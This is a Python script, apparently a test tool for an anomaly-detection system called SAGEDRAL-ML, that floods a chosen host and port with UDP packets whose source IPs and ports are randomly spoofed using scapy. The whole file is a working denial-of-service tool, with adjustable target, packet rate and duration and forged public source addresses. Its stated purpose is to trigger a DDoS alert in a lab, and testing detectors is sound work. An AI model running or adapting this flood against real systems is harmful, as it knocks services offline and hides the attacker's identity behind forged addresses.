#!/usr/bin/env python3
"""
spoofed_udp_flood.py — UDP flood with SPOOFED random source IPs + ports.

ATTACKER SIDE (Windows/WSL root):
    sudo python3 scripts/testing/spoofed_udp_flood.py \
        --target 192.168.1.123 \
        --port 53 \
        --pps 600 \
        --duration 15
"""
import argparse
import random
import sys
import time

try:
    from scapy.all import IP, UDP, Raw, send, conf
except ImportError:
    print("[FATAL] scapy (+ Npcap on Windows) required. pip install scapy")
    sys.exit(1)

conf.verb = 0


def _rand_spoofed_src() -> str:
    while True:
        a = random.randint(1, 223)
        if a in (10, 127, 169, 192):
            continue
        b = random.randint(0, 255)
        if a == 172 and 16 <= b <= 31:
            continue
        if a == 192 and b == 168:
            continue
        return f"{a}.{b}.{random.randint(0,255)}.{random.randint(1,254)}"


def udp_flood(target, dport, pps, duration, payload_len=64):
    print("=" * 70)
    print(f"  SPOOFED UDP FLOOD — Target: {target}:{dport}/udp")
    print(f"  Rate: ~{pps} pkt/s | Duration: {duration}s | Payload: {payload_len}B")
    print(f"  SAFETY: Random spoofed src IPs — real host IP never used ✅")
    print("=" * 70)
    time.sleep(2)

    interval = 1.0 / max(pps, 1)
    end_ts = time.time() + duration
    sent = 0
    last_report = time.time()
    src_pool = [_rand_spoofed_src() for _ in range(500)]

    try:
        while time.time() < end_ts:
            src = random.choice(src_pool)
            sport = random.randint(1024, 65535)
            payload = bytes(random.getrandbits(8) for _ in range(payload_len))
            pkt = IP(src=src, dst=target) / UDP(sport=sport, dport=dport) / Raw(load=payload)
            send(pkt, verbose=0)
            sent += 1
            time.sleep(interval)
            if time.time() - last_report >= 2.0:
                elapsed = max(0.001, (time.time() - (end_ts - duration)))
                print(f"  [+] Sent {sent} UDP pkts | avg {sent/elapsed:.1f} pkt/s | src={src}")
                last_report = time.time()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")

    print("-" * 70)
    print(f"[DONE] Total UDP sent: {sent} packets.")
    print(f"       -> SAGEDRAL-ML should see high PPS -> DDoS anomaly alert.")
    print(f"\n👉 Verify: sagedral-ml alerts list --limit 20")


def main():
    p = argparse.ArgumentParser(description="UDP Flood with SPOOFED random source IPs")
    p.add_argument("--target", "-t", required=True)
    p.add_argument("--port", "-p", type=int, default=53)
    p.add_argument("--pps", type=int, default=500)
    p.add_argument("--duration", "-d", type=int, default=15)
    p.add_argument("--payload", type=int, default=64)
    args = p.parse_args()
    udp_flood(args.target, args.port, args.pps, args.duration, args.payload)


if __name__ == "__main__":
    main()
